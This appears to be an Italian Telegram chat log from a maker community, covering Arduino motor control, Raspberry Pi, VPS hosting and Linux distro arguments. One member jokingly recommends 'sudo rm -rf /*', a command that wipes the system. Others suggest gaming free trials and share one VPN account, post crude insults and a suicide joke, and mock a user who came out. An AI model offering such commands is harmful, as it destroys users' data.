?
È python3-pip
si
domanda
Io ho un utente sul mio rasp
come gli limito la memoria?
Staccandogliela
?
why?
?
oo maaa god
 non so se è più esilarante il tavolino in bambù o il giornale usato con mousepad
figo! Buonasera a tutti. Grazie 
Benvenuto
Benvenuto!
GRAZIE
mi sa che presto vi romperò le scatole
Avete pdf su Nikola Tesla o Elon Musk?
scorri in sù
Grazie
Uhm... Non c'è nulla su Tesla...
mi sembrava 🤔 su Musk sono sicuro
Si, su musk c'è
non immaginavo di tornare a studiare...... tutta altra cosa 🤔
Me se nello sketch arduino ho un analogWrite il pin che utilizzo è analogico?
I pin di Arduino non sono proprio analogici
Per dare un segnale output analogico usa il pwm
Ho un l298n e ho copypastato uno sketch di un turco
È il guidatv
 
In input invece se non erro si usano i pin con la lettera a
Boh l'avrà testato lui allora e dovrebbe funzionare
Fa questo
SPD è una variabile?
Ma quella è una funziona definita dopo dal tipo?
È la velocità dei motori che imposto io
Lui dice se il comando è BACKWARD, allora i motori devono essere tot
Ma non capisco quel analogWrite(MotorRe,spd)
Ma devi usare un pin pwm non un analogico
È collegato a un digital
Che Arduino stai usando?
Precisamente dal L298N enA al pin Dig 9
Nano
Usa i pin su cui c'è scritto pwm
Ma lo fa già
Il mio dubbio era se analogWrite volesse dire altro
Grazie ragaz
Ce secondo me quel analogWrite è inutile
Si, praticamente con analogWrite tu butti fuori un segnale pwm, cosa diversa per l analogRead
Non è inutile, perché è l' indice di quanta potenza vuoi fare uscire dall' L298N
In poche parole
Ah, questo non lo sapevo
Grazie
Che va da 0 a 255
Tipo analogWrite (9,127); vuol dire Che la potenza è del 50%
Blog back online, gente! 
Ahahahahahahahah
Se lasci il connettore sul enable non serve in effetti... Ma i motori poi vanno sempre al massimo
Ora che mi arrivano i nuovi motori con i riduttori potrò costatare cosa cambiare
Perché li basta che metto il ponte su enB e enA piuttosto che collegarli ad arduino giusto?
Sì o li colleghi direttamente al pin a 5V o con un digitalwrite normale
Una domanda
Nel libro c'è scritto che ha creato "Blastar" e che il sorgente è stato pubblicato. Posso trovarlo da qualche parte?
dunno 🤷‍♂
Se è closed non credo
Mai sentito Blastar
Ciao
Ho bisogno di un consiglio per delle batterie a litio
Lol
 ha bisogno di estremo aiuto, ha fatto un bel danno, vedi che puoi fare
Help
HK LiitoKala lii-50A 
 mah batteria al litio 3.7 V 5000 mAh 26650 batteria ricaricabile 26650-50A adatto per flashligh NUOVO
 
Quant'hanno di scarico queste batterie?
Buongiorno, ho in mente di fare questo progetto: Con un joistick vorrei pilotare due motori stepper, il movimento destra sinistra dovrebbe muovere un motore ( asse X ) l'altro motore si dovrebbe azionare muovendo lo stick sopra e sotto ( Asse Y ) e se possibile var vedere le coordinate su display
Dove posso trovare del materiale?
basta un arduino e i driver per i passo passo, puoi trovare tutto su bangood
Sì, dove posso prendere i codici per capire
Ahahahah questa la voglio sentire anch'io
Beh il codice è abbastanza semplice, basta che ti trovi una libreria per gli stepper (occhio che ce ne sono che non funzionano)
ciao, ho un probema, su raspbian-strech-lite il file system è in modalità read-only si può cambiare modalità??
?_?
Ma da dove posso cominciare..... sono alle prime armi. Grazie cmq della risposta
Spoilers per il video di oggi
Mani trasparenti 
Sai programmare con arduino? Conosci il C/C++?
ok ho risolto, per coloro che hanno avuto il mio problema basta digitare
sudo mount -o remount, rw /
Ma hai studiato qualcosa su Arduino?
Forse ti conviene un libro su Arduino giusto per capire cos'è e orientati un minimo sulla sua programmazione, 
  ha fatto una serie di video molto introduttivi su questo mondo...
Poi per il tuo caso servono degli stepper, dei driver per stepper (puoi usare anche una rams probabilmente) dei joystick... E poi ti guardi in rete degli esemi di utilizzo di arduino con i joystick e con la libreria stepper... Un po' di colla vinilica e unisci i codici
si ho cominciato a farlo
HO un manuale base, per capire il funzionamento, e fatto piccoli esercizi
ma se non oso non parto mai
Ma vuoi usare i nema 17?
partire con quelli, ma potrei usare altri. Cmq motori che abbiano una buona coppia in quanto devono spostare oggetti dai 300gr ai 3-4 Kg
Allora cercati qualche tutorial su come far funzionare gli stepper, per il joystick c’è il video di overvolt
si già testati con il kit
Per la comunicazione con il pc è alquanto complicato a parte per il monitor seriale dell’idea di arduino
ero già iscritto su overvolt 🤣

 ‎€2‎21‎.6‎0 ‎in‎ve‎ce‎ c‎he‎ €‎28‎7.‎26
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎2.‎86%
⭐️‎ 4‎.7‎0 ‌‎/‌‎ ‎5.‎00‎ (‎3 ‎re‎ce‎ns‎io‎ni)
 Store: Banggood
 

è il doogee mix 2
Avevo visto che c’era un programma per testare gli stepper delle stampanti 3d che fa tutto in automatico
la mia idea e mettere su tutta l'elettronica e creare un case dove inserire il tutto
display intendi del pc o tipo marlin sullo schermetto della stampante? XD
LCD
Altrimenti ti basta un Serial.print(ascissa)
Serial.println(ordinata)
Ah allora usa la libreria per lcd
perché c'era questo 

grazie, mi chiedevo se con Arduino Nano potesse controllare i motori
sì ma forse forse io utilizzerei un arduino mega  con la ramps XD
almeno lo potrei riciclare male che vada
sono pieno XD
??
ditra sensori e schede
Con il nano e 2 motori non riesci a farli andare veloci
Già vanno lenti con il mega
in che senso
Che arduino deve inviare un segnale per ogni step
Quindi già di per sè girano piano
Massima velocità?  Non mi servono velocità eccessive
Parlo di circa 30/40 rpm
Almeno io non riesco a farli andare più veloci
Più ne colleghi più vanno piano, meno è veloce arduino più vanno piano
La mega nelle stampanti 3d si comporta bene
E aziona 4 motori
X  Y ed E vanno bene insieme
Dipende da che motori sono e dai loro driver
già un A4988 o un DRV8825 vanno benissimo, tra l'altro non devi farli girare alla massima potenza
una velocità max 60mm/s
Ti dico solo che si parla di aver buttato 500€
Potentissimo telefono che dopo due settimane è talmente autonomo che si spegne da solo a SOLI 221€! Con questo telefono vi verrà istintivo SUICUDSRVI! Fatelo ora! Compratelo!
 
 quanto sono pazzi da uno a buttiamo migliaia di euro di drone ?
Ahahaah
Non l'ho mai visto questo, dopo vedo
Sarebbe
Arduino manda dei segnali seriale che vengono trasformati in variabili su Python, quelle variabili vengono usate per cambiare la rotazione
Gg
Mi pare un po' inutile così
Aggiungi un potenziometro
E con un ponte di Whitestone fai il circuito
Non è finito
Sto facendo il braccio con la stampante 3d
Ci aggiungo i motori
Si certo però
Intendo i dati che invia l'arduino
E li controllo con un joystick o con un loop automatico
Arduino invia posizione e temperatura dei motori
Ecco con un joystick ha già piu senso
Così da verificare che la posizione effettiva sia uguale a quella teorica
Eh ma ha senso anche con il loop automatico perchè i motori non hanno il controllo di posizione
Che motori usi che ti inviano anche la temperatura?
Ci attacco io un termistore
Ah ecco
Con una pasta termoconduttiva
Sperando che funzioni
(Sono gli stepper piccoli che includono nei kit di solito)
Ahh
Dipende molto dalle dimensioni del braccio robotico
Alimentati a 12 v riescono ad alzarlo ma si scaldano non poco
Quelli non sono di chissà quale potenza diciamo
Non mi sono mai preoccupato della temperatura onestamente
Questo è il primo link
Mii
Bello grande
Eh lo so purtroppo
Dai test per ora tiene
Neanche io, cioè scottano ma riesco a toccarli quindi non fondono
Però fa Figo avere i sensori di temperatura
Si puoi anche fare una curva di temperatura tipo per rappresentarli
Vabbè la temperatura ti può tornare utile
Poi non credo che arrivino a 190 gradi che si scioglie il PLA ahah
Nono ma va
Il problema che sto riscontrando ora è come muovere tutti i motori assieme
Con la libreria che ho vanno piano
Usi l'alimentatore esterno?
Si
Che driver hai?
Uln2003
Spe
Che non fa niente di utile
Vabbè niente di particolare
Praticamente converte il segnale di 4 pin in accensione e spegnimento delle bobine del motore
Quindi per ogni passo arduino deve mandare un segnale
Si si lo so
Ma hai comprato il kit cinese?
Kuman
No ho preso 7 motori singoli da AliExpress
Ah gg
E un arduino mega
Ora pensavo di usare un nano per ogni motore e inviare al nano tramite i2c le istruzioni dal mega
Mh si non sarebbe male
Però è parecchio un bordello certo dipende anche da quanti motori usi
In tutto sono 5
La vedo abbastanza dura
Manco a pensare per il cable management lol
Jumper a volontà 
Mal che vada uso i 5 nano separati
Si ma comunque devi metterli in comunicazione
Magari faresti qualcosa di veramente figo
Comunicazione wireless
Eh ma come?
NSSJSJSJJSSJSJJSJSJJSJJS

Bluetooth
Non è molto grande il modulo
Si ma funziona solo tra 2 schede
Magari collego il mega al Bluetooth e mi faccio un joystick wireless 
🤷‍♂
Hai fuso il PTFE all'interno,
Si guadagna tanto fidati
ma che ca
Consigliate tastiera wireless o con filo?
ahahahahahahah
Dipende da che ci devi fare
In generale ti consiglio una tastiera cablata
Perchè?
latenza
Perché su quella wireless è maggiore la latenza e devi ricordarti di cambiare batteria ogni x mesi
La prendo principalmente per il Rasp
ahhh allora vai di wireless
Mh, dipende da come devi usarla
Se lo attacchi alla TV prendi quella wireless con il nousepad integrato
per un rasp la latenza in più della wireless non ti fa un baffo
E poi se attacco il portatile a un monitor
una cablata è preferibile solo se la devi usare in gaming che devi avere latenza minima
0 gaming io
!
E mai possibile 1.85gr?
Ahahahahah
Magari se voglio programmare tipo sul divano collegando il pc alla tv
e poi per un rasp è anche più comodo perchè puoi tenere la usb della wireless sempre attaccata senza ingombrare troppo
Nono, anche perché quelle wireless economiche sono di plasticaccia
Cablate no?
Non ne devo fare un uso professionale
La mia l'ho pagata pochissimo eppure è molto comoda
potete mandare il canale che avete mandato ieri con tutti quei libri
Tipo quanto?
Se devi usarla 20 minuti al giorno ok, ma se ci devi scrivere tanto ti viene il cancro con certe tastiere
io ho una tastiera ms cablata ergonomica che è costata 5€ e funziona bene da tipo 3 anni 
50€
e.e
Ce ne sono di più economiche
^ 
Tieni conto che da 3 anni a oggi ho sempre usato quella del portatile
Subito negli sticker ❤️

Sicuro, ma si passa alla fascia più bassa
Chi è che ha tentato dopo millenni di mandare il carattere cinese? hahahaahah
Che comporta meno durata? Oppure sono meno “comode”?
Entrambe le cose direi
scaricati TUTTI 
così, per fare scorta lol
tanto ho 1tb di storage esterno che non ho riempito manco per metà 
E sono più comode quelle “slim” o quelle con i tasti alti classiche?
Ma che caz c'entra il signore degli anelli con makebooks? 
.-.
:(
salve gienta
Ozalve
questa sera cucino un polpo, qualcuno che sappia come fare per evitare che diventi duro come il cibo della mensa delle elementari?
Io ne ho alcune... Ma marco non vuole
metti nell'acqua che usi per cuocerlo un mezzo bicchiere di aceto di vino, e qualche peperoncino piccante e poco sale. poi quando l'acqua bolle, metti il polipo (sviscerato) e calcola circa 40 minuti, poi spegni il fuoco. lascia il polipo ancora 15/20n minuti nella sua acqua. togli il polipo, togli la pelle aiutandoti con acqua fredda corrente (per non scottarti) poi taglia...  ecc
🤣🤣🤣🤣🤣🤣🤣🤣
ook thxxxx
Ok ricevere 5 notifiche per un video diventa un po' stressante
qUaSi quAsI mI dISisCriVo
faccio a meno del peperoncino.. al massimo chicchi di pepe nero(lo devono mangiare pure i miei), poi credo che farò tipo con la pelle, non serve necessariamente toglierla no?
cit.
Congelalo lol
l'ho comprato tipo 1 ora fa e lo voglio mangiare stasera ._.
non ha senso congelarlo
Puoi non chiamarlo polipo?
Era scongelato vero?
yep
Ah menomale
che è successo?
Ovviamente quelle con i tasti alti.
Quelle sottili sono a mio parere scomode e a lungo andare mi fanno pure male le mani
prendi una wireless Logitech con touchpad integrato e risolvi
Il tizio ha buttato 500€, per alte informazioni è lui 

E ci leggi sulla TV poi?
Se vuoi sul gruppo ho un libro su py facilissimo, per età 10 anni più o meno
Se non meno
Si
Ciao Ragazzi 
ho un problema con un hard disc Western Digital Green
Tramite un o.s per nas ho impostato la funzione a basso consumo/bassa rumorosità

Adesso però quel sistema operativo da nas non c’è l’ho più ma il disco resta in questa modalità


Che posso fare? 
C’è magari qualche programma per Windows per modificare queste cose sul disco?

Spero possiate aiutarmi, grazie
Io ci diventerei cieco 
Fidati che si vede bene su una 55 pollici a 2 metri di distanza
Dici
Io su un 40 pollici a un metro già non leggo
e non l'avevi messo su MalersBook? io manuali di Arduino completi ne ho parecchi, ma se è alle prime armi sono inutili
Devo sempre ussre lo zoom di Windows ad almeno 150-200% (che poi è la stessa cosa di abbassare la risoluzione)
🤔sicuro che rimanga impostato cosi? hai provato a fare un test con CristalDisk? oppure a fare un backup e formattarlo?
Ma a sto punto sarà una cosa del bios forse?
TNX
No, io su python ho il libro
Ma poi mi arrivano a caso richieste di grafiche da parte di youtubers di mc boh

Passale a me se pagano 
gratis, ma mi nominano 
e comunque sono in c4d
Sto bene così allora
no credo..credo sia come quando si crittografa il disco, che non si può sbloccare se non è presente lo stesso sistema operativo..a me è capitato più di una volta con utenti Winzozz passati a Ubuntu
L’ho già formattato diverse volte ma nulla 

Ho provato con cristaldiskinfo ma nulla comunque
A ok capito...beh effettivamente potrebbe essere...ma se è così l'unica è svuolare l'hdd come spazio libero, e poi installare tutto con la crittografia dell'os che usa....oppure esistono anche altri modi?
Nemmeno quello perché ho provato sia collegato al controller SATA del Pc sia ad un dock usb collegato ad un altro pc
Quindi in poche parole mi toccherebbe reinstallare nas4free?
Si infatti abbasso la risoluzione
si ti conviene..lo reinstalli, modifichi i parametri sbloccando tutto e poi lo estrai e formatti..sicuramente c'è qualche blocco software
Salve, è un saluto a overdose sono un tuo grande fan.
?
Overvolt
Sto corretore
Ma lol
Ma tu stai in next
Fate un salto e overvolt dammi un parere
Ma che è overvolt?!
Boh secondo me è spam
 spam
Lol
Mi hai preceduto
Ora il mondo è più pulito
Ma ora per curiosità me lo salvo e ci faccio un salto
Saluto a overdose
K
Salve, sono overdose
Nerdoverdose
Quelli che fanno le magliette ai Mates
Lol
È ingiusto che tu puoi mandare le GIF e noi no
un mio compagno ha preso la neve dalla finestra, l'ha messa sul banco e quando é entrata la prof si è messo a sniffarla
GENIO
Hahahha
Zucchero delle macchinette del caffè, anche
Ma lì lo allinei solo sul banco, non penso faccia troppo bene riempirsi di zucchero 
Come no
È buono
Hahahahaahhaha
ma infatti
È come ingerire piccole dosi di Cianuro per evitarne avvelenamenti, con lo zucchero in questo modo non ti viene assolutamente il diabete 
ASSOLUTAMENTE
Se vuoi ho il loro numero
🤨

*switches to a Python Web Framework*
Perché mi hai eliminato tutti i messaggi? 

Per non dare strane idee in giro
Grazie comunque della segnalazione
Ah ok
al massimo scrivi ->
-> qui
che simpatico che sono ☺️
Proprio
È un userbot
Appunto
Non scrivo agli userbot sorry
Magari mi segnalano per spam
Metti che il VoIP passa ad un arabo che segnala tutti
no oh
è un voip
Sono umano, eh
Appunto, metti che il numero passa ad un arabo e segnala tutti
ehm... esiste la password
Magari la azzecca
🤷‍♂
Non voglio che il mercurio venga segnalato
Si mi sa che farò proprio così 

Grazie
Ma ormai sto vedendo che non limitano più così tanto
Almeno a me non limitano da quasi un anno
Io fortunatamente ho un altro account completamente immune dalle limitazioni
Non è uno userbot
poi che senso ha limitare se non hai fatto niente? durano una settimana la prima volta
Un bot era più comodo
Tutti avrebbero potuto scrivergli
Eh ma così ci siamo noi dietro
Vere persone
con un bot non possiamo rispondere alle persone direttamente e non possiamo usare lo stesso profilo in 5 persone
appunto
Io non sono mai stato limitato 🤔
rimedio subito
Bastava che forwardava i messaggi in un gruppo e per rispondere bastava mandare un messaggio in risposta
Mai limitato
Ma lo devi programmare
Così tutti possono scrivere ez
Così invece bello rapido rapido
Sono 30 righe di Python
Per un VoIP devi fare 200 captcha
Poi come minimo ti trovi l’account pieno di gruppi e canali arabi
Eh pace
Segnalazioni ha la password, contatti puliti ecc
Guarda quanti contatti mi ritrovo io con i VoIP lol
Con quel profilo:
- Possiamo rispondere subito
- Arrivano le notifiche a tutti
- Possiamo usarlo tutti
- È molto più comodo, chatti con le persone direttamente
- Quelli limitati sono lo 0.01%
basta eliminarli 
comunque non vedo l'utilità di discutere su che metodo usare per raccogliere segnalazioni
Basta eliminarli 
Comunque se vuoi faccio rendere 
 blog immune dalle limitazioni
Ecco ecco
Eliminali tu 1037 contatti uno alla volta
non serve, è la gente a scriverci per prima, quindi anche se fossimo segnalati cambia nulla
Esiste Javascript 
Faccio prima a cambiare telefono
Cambiare iPhone va sempre bene

Mel’hanno regalato :)
Appena mi si rompe questo, mi danno l’X
Usati si rivendono a parecchio
Ecco quello usato lo rivendi anche a 700 euro
Magari lo vendo allora
Oh io le ricevevo random un tempo
Non facevo niente e non scrivevo a nessuno
Possono limitarti anche nei gruppi
ehlamadonna
con gli stessi soldi ci prendi un S9, waay più figo
o un P20
Con la fotocamera intelligent... ah no
Guarda quanto dura la batteria
Ti avanzano pure*
Non li scelgo io i telefoni
Me li danno loro
"La domanda è loro chi"
cit.
Ahahahah
L’azienda
"last full charge"
come le previsioni di Windows
Ergo l'hai csricato 4 volte al 99%
E non si è resettato
Nope
eh appunto lol
Fidati che 20 ore di schermo non le fa manco il mio portatile con 1kg di batteria
Ho la batteria maggiorata
E con il jailbreak ho disabilitato i servizi inutili
 ho fatto un acquisto su bangood abbastanza costoso, ti è arrivato???
Se hai la sua estensione si
Sì che ha 20Ah?
Non conosco ste robe qua
(Il che significa che dovrebbe essere spessa almeno 4cm)
Giornooo
Ops
Io con 2500mAh faccio 2 ore di schermo

Gli iPhone consumano di meno
Con una ROM pulita il più possibile
Nono, sono gli S6 che scaldano anche da spenti per farti capire
L'Exynos7420 è uno dei peggiori processori che Samsung abbia mai fatto
Poi ti trovi gli S6 che fanno 5 ore e non scaldano e quelli che ne fanno 2.
Doogee Mix?
È arrivato ma è in preorder
Aspe, ma tu sei quello di YouTube?
Si esatto ahahah
Si
Si, sono quello che sta sempre con gli occhiali da sole e va in giro in longboard elettrico
Spe che mi faccio un selfie
L'ho già visto un tizio così
AAAH ho capitoo... sei quello che ha il drone con l'intelligenza artificiale là... o come si chiama
eccomi, salve
Ahahahahahaha
Perchè sei nel deserto? 
Dissing
Omeodeo
Bah son venuto a fare un giretto perché avevo un po freddo e con tutti i soldi che c'ho...
giusto
se reinstallo il firmware del telefonino con odin, si resetta?(ho dimenticato la password 🤦‍♂️)
Dovrebbe
ok, grazie milel Filippo.
A be il ragionamento fila... nulla da dire
Lol

qualcuno sa se l'account nordvpn è condivisibile tra 2 persone?
Certo, noi lo usavamo in 4
La madonna
Hai infiniti device 
Ma prendi il free e ogni tre giorni fai una mail nuova come faccio io
Non è meglio la mia soluzione?
Nah scomodissimo
Però risparmi 
Aspetta
Non hai visto la mia idea per le vps 
Si, l'idea di creare una nuova email ogni 2/3 giorni mi era venuta.. però cavoli vorrei darglieli quattro spicci per il servizio che mi offrono 
Troppo generoso

Conoscete siti di template per powerpoint?
Benvenuto!
E poi ci sono io che non uso né Wi-Fi né VPN
Google Slides  a parte gli scherzi, le fa veramente fighe le presentazioni
qualcosa mi dice che è per l'esame
Si
Ne avevo trovata una semplice ma bella, ma l'ho già usata
Come?!
Esiste anche uno chiamato pw qualcosa che si può usare online
?
óóoá
?
Qualcuno ha una vps da gaming?
Cosa vuol dire VPS da Gaming ahahahaha
Wtf, non ho i dati della CIA nel telefono eh
Qualcuno mi puo dire il perché?
Qualcuno mi può uccidere?
È scritto
Se mi sniffassero i pacchetti al massimo troverebbero i siti non https che apro...
Leggi

... ah no 
Non le conosci?
Che hanno un i7 invece di uno Xeon
Perché nei giochi si preferisce la frequenza più alta al multicore
Protezione antivirus ddods e cose varie
Noi abbiamo preso un vps gaming da 16GB con l'8700k e si comporta molto bene
Message not found
Che scheda video?
Ma se è un VPS
Non ha proprio l'interfaccia grafica installata tra l'altro
Filippo, ti devo spiegare sempre tutto? è la magia del green screen
Le VPS non possono avere schede video?
No visto che sono macchine virtuali
Ovvero che fisicamente non esistono, e se per questo non hanno manco processore, RAM e storage
Noi?
ma no hahahaha è una foto di Casey
Posso avere comunque schede video
però quanto cazzo è brutto..quando sorride sembra Dracula stitico
Nel server che le hosta sì
Ahahahahahahahahahahahahahahahhahaahhahaahahhahahahaahhaahahhahahaahhahahahagahahahahahahahahahahahahahah
Però ha i soldi...tanti
Esistono VPS con schede video dedicate
 
E sai, non penso proprio abbia una scheda video visto che nei datacenter non ci sono i monitor collegati ai server
Neanche troppi
Magari è una VPS che fa render video :)
Che ne sai?
?
ma che ti serve una gpu su una vps? a fare mining? hahaahahaha
E allora è un altro conto

Ma se ti dico VPS gaming
Da quando gaming = rendering?
A renderizzare
ma stavamo parlando di gaming
^
Ragazzi non cambiate discorso
Scrivi bene
Io voglio sapere se funziona 
Tra l'altro la nostra è hostata in Italia e dice di avere la Gigabit ma ne dubito abbastanza
Ohhhhh
Io ne ho una in Canada con 6Gbit/s
Top
Ohhhhhhhhh
In realtà é un dedicato con una titan V
 mi deludi
Ma per Minecraft 1Gbps basta finché hai qualche migliaio di player
le regole son regole 
Madonna partono santi
Mi dite se funziona bene o no?!
Non si bestemmia!
È anche illegale
Loooooooool
ricordo di gente direttamente bannata per cose cosi'
Ma io sono utile al gruppo
Porto cultura 
quella volta che è stato bannato un tizio era perchè continuava (non ero neanche mod in quel periodo)
Io invece sono utile
Questo non ti consente di scavalcare le regole
Io dico il fatto del bannato 
poi cominciano a farlo tutti sennò, non prenderla personalmente 
ah ma non era sol per quello hahahaha
Mica ho abbandonato oh 
mi ricordo anche, aveva tirato 4/5 porconi e aveva insultato Marco & company
Però aspetto qualcuno che mi può dire se conviene o no la vps da gaming
Che infame!
Dovrebbe essere denunciato
Non sono ancora arrivato a quei livelli
Lol
Dipende per cosa ti serve
Vps da gaming...a cosa può servire secondo te?
Io ho un PC da gaming da 3000 euro e odio giocare, per cui....
cos?
Ha insultato persone
È cyberbullismo
Dovrebbero denunciare per insulti di persone a cazzo 
e?
Ma lol
Ma tu sei pazzo
non esattamente
Sono coglioni alla cazzo in realtà
Molte persone si sentono male quando vengono insultate
Non sono perenni
capita
non vedo che problema ci sia 
non serve farla così tragica
Invece si!
Perché sennò senza vps come gioco?!
ma non dicevo a te hahahaahaha
Lo avevo capito
Ma era il momento giusto loer far tornare la mia domanda 
Cose da fare quando hai una VPS:
AHAHAHAAHAHAHAH
Ahahahahahah
Emanuele ha una vps?!
Si
Buono a sapersi 
Se hai apt, il comando migliore è sudo rm -rf /*
No, in realtà è per un progetto di 
, 
 e me
Magari c'avessi i soldi per comprarmela
ma che c'entra apt con quello hahahaah
di cui 
 è il ricco che ha i money per la vps
E se ti dicessi che ho trovato il modo di prndra gratis?
Sbovvo per terra.
Ci sono due modi veramente
Il probelema è quello che ho mandato prima
generalmente si chiama rubare ma dettagli
No
Perché non uso nulla di falso
Le Debian based fanno pena
Quindi no
per quello che ci serve è ottima
non mi sembra poi troppo forte come dimostrazione
e performa anche parecchio bene
Scusa eh, ma per te usare i periodi di trial è rubare?
Bah, preferisco altre distro
Debian non è il massimo
non penso rientri nelle policy del servizio. probabilmente non e' definibile rubare ma dubito sia una forma legale di utilizzo del servizio
tipo?
Gentoo
Lo uso su server, desktop e notebook
Debian è da nabbi
non so quanto una rolling release sia ottimale per un server
Io lo so invece
È ottima
mah, per un server preferirei la stabilita' di debian piuttosto
Troppo pesante, meglio gentoo
Non so tu, ma il mio dedicato non ha 32TB di ram
si ma dipende dal tipo di servizio. non penso troverai molti server di produzione con gentoo
Pensala come vuoi, fatto sta che Debian fa schifo
kek
posso sapere che fa il tuo server?
Ho un bel po di bot/userbot telegram, alcuni server di un servizio mio, moltissimi siti, un paio di vm e la copia dei miei 25TB di files
cosa intendi con moltissimi siti?
Alcuni siti privati che ho
Che uso per un mio servizio, non hanno dominio
può farlo benissimo anche una vps con sopra una distro debian eh
Una VPS non basta, e poi con Debian hai poco controllo sul sistema
non che facciano chissà quanta differenza le distro, se tieni solo le robe che ti servono
Preferisco Gentoo
Con Debian è già tanto se puoi cambiare hostname
Sono configurabili alla stessa identica maniera
gia da moltissimi siamo arrivati ad alcuni
comunque e' quello che dicevo ma non mi hai ascoltato: per un server in produzione non sceglierei gentoo. poi se hai un piccolo server personale fai quel che vuoi
Su Gentoo puoi personalizzare molte più cose
Guarda che gentoo è ultra stable
Solo la compilazione
Stop
Piccolo non direi
E comunque puoi personalizzare la compilazione anche su debian
really? non avrei detto
Sisi
È fantastico
si ma non e' un server di produzione
Su Gentoo in fase di installazione personalizzi quello che vuoi
Perché no?
E poi apt fa cagare, siamo sinceri
intendo il suo
Quando personalizzi != non poter personalizzare
WTF
ad esempio?
Trial di 1 mese
ah va beh
altrimenti? hai scritto due modi
Però è free
Debian fa penaaaa
Quello da 7 giorni
Meglio di niente oh
è una tua opinione ‍♂️
cancella tutto
Ovvio
Non ho mai imposto niente a nessuno
Hg(OH)2
Finalmente l’hai scritto bene
sì ma sono autistico
oggi in particolare
Ah ok
Comunque non so se vi interessa, ma sono gay
Mi dici cosa dobbiamo farci con questa informazione?
Sembra che vuoi essere discriminato detto così 
Avrebbe dovuto dire di essere marocchino
Possibilmente vicino a Milano
Ahahahahahah
Non è un sito per incontri 
Chissà, magari lo è 
Nono
Che vive al sud

Su tinder non trovo nessuno
Per cui chiedevo qui, mi piacciono anche i sysadmin single
Vai su yp
Eh ma vorrei conoscere qualcuno
Io ho un'idea
Una persona in questo gruppo potrebbe essere interessata
Ahahahahahahahahahahahahahahahahahhahahahahahahahahahahahahahhahahahahahahahahahahahahhahahahahahahahahahahahahahahahahahahahhahahahahahahahahahahahahaahahahhahahahahahahaahhahahahahahahahahahahahahahahahhahahahahahahahahahahahahahahahahahahahahhahahahahahahhahahahahhahahahahahhahahahah
Mmmh, magari ne ordino un paio, grazie!
Chi?
Romboli
Prova a taggarlo
Vediamo che ti risponde 
@ romboli?
secondo me gli risponde 
 
Ahahahahahahah
A chi possiamo farlo conoscere sennò?
A korry!

Aspe ma non era quello di YouTube?
aridaje
si
Aspetta, faccio io per te
Al massimo banna me
OverVolt intendo
Lo seguo
è il suo gruppo questo, ci credo che sia lui 
Ah ma è admin!
 
 
 
 
 
 
 
  qualcuno di voi è interessato? Secondo me alla mano potrebbe piacere 
no
Lol
Ah, serio?
Chi più posso taggare?
Ahahahahah
non lo sapevo
Meglio allora
ti basta guardare la foto del gruppo
Ma come cazzo ci sei finto in questo gruppo?
Taggo anche cicca?
i misteri irrisolti
il polpo qua sta cuocendo, non ci spero neanche io :D
O dite che mi picchia?
Ho trovato un VoIP con un tizio che era dentro in questo gruppo e ci sono entrato pure io
Cicca lo conosco
Troppo grande per me, io ho 19 anni
Vabbè noi chiediamo
Marco adesso mi banna
 A quanto pare bisognerebbe spiegare la differenza tra un gruppo di Makers e un sito d'incontri.
Lol
Oh aspettate
Non bannatelo
In realtà io ho risposto ad Enomis
Ho dimenticato di taggare Emanuele
E io ho sparso la voce per chiedere pretendenti alla tua mano
tranqui, probabilmente trolla 
E poi tu sei admin
Secondo me è il VoIP del tuo caro amico
e quindi?
Non sono VoIP
chi? 🤔
hai appena detto che entrando nel voip hai visto sto gruppo 
Beh, avrebbe potuto warnarmi direttamente lui al posto di fare @ admin
Quello che aveva la pic di un lama
ma non ho fatto io 
Comunque non mi sembra di aver violato nessuna regola
e 
 è diverso da warnare
Infatti parlo con quello di switchando
e chi ti ha detto qualcosa?
Ahahahahahahahahahahahahahahahahahhahahahahahahahahahahahahahhahahahahahahahahahahahahhahahahahahahahahahahahahahahahahahahahhahahahahahahahahahahahahaahahahhahahahahahahaahhahahahahahahahahahahahahahahahhahahahahahahahahahahahahahahahahahahahahhahahahahahahhahahahahhahahahahahhahahahah
che non è admin
Il tizio di switchando
Ha fatto una segnalazione per gli admin quando lui è admin :)
non è admin
A me dice di si
??
Boh vabbè
Dove mi vedi?
Secondo me dovrebbe essere admin
Ha fatto anche i video con overVolt
Mezzo video*
ma riesci a fare un discordo completo?  prima dici una cosa e poi un'altra diversa
Ahahahahahahah
Non ci sono più i troll di una volta
grazie Gesù
Non ti stava simpatico Marco?
Chiamasi bipolarità
Ahahahahah
Non ho seguito la discussione ma se vuoi bannare qualcuno banna pure eh 
no beh bannarlo è troppo...
È uscito rip
Non ha bannato perché stavamo aspettando di vedere se qualcuno di voi era interessato
No beh la situazione è che lui se ne esce con "volevo dirvi che sono gay"
È stato un troll venuto male oh
tentativo di rientrare per togliersi il mute in 3, 2, 1...
MOLTO male
È come se io scrivessi "volevo dirvi che sono etero", sticazzi?
Ahahahaha
 
+1
Magari non trovava nessuno altrove
Sapete il vero problema?
Facciamo che
d'accordissimo
io non ti ho insegnato questo, mio alievooo
Quoto
HAHAHAHAHAHAHAHA ❤️
Giulian Tu?
benvenuto nella famiglia de tecnici
Interessato?
Mi dispiace lasciarlo solo
Perché i suoi 
 hanno sgamato più di un trollino
Ahahahahahah
Ciao Mercury
Benvenuto
 interessato?
 ciao
Le bestemmie sono bannabili qua vero?
Non perdi il 
 se esci e rientri 
No
warn anche sì, ban è troppo
Thanks
Comunque non sarò uno staffer molto attivo eh, ho troppi progetti e un altro gruppo da seguire
Hai due giorni di mute, non serve far dentro e fuori 
Ahahahahah
Warn sicuro, ban l'ho usato solo per keziolio e Goth  Comunque da gestore hai il comando 
 per eliminare messaggi
Sisi conosco grouphelp

Confermo, l'ha provato 
 su di me prima
Che ricordi Kezi 
comunque esiste un modo legale per avere VPS gratis, SkySilk
Che fine aveva fatto?
Bannare keziolio è come darsi una martellata sui coglioni
avrete la vostra vps gratis fin tanto che il servizio rimarrà in beta
Eh, ma io volevo provare a minare
morto e risuscitato 4/5 volte, poi definitivamente morto 
In quel sito è illegale, quindi...
ma perchè mai
Perché sono scemo
ok
Non si era capito?
Qualcuno fra voi radioamatore?
Ho comprato una nuova antenna ma non so come collegare massa e segnale
Buonasera 
Quanti anni avete?
Sei amico di 
?
Chi e?
Comnuque nn lo conosco
Tutto nella mia Bio
Cosa vuol dire "Devloper"?
Sviluppatore
Principalmente sviluppo Web App (utilizzo Python con Flask)
Nn capisco niente di quelle robe lì 
Il mio nome dice tutto penso
old but gold
e pizzica
^
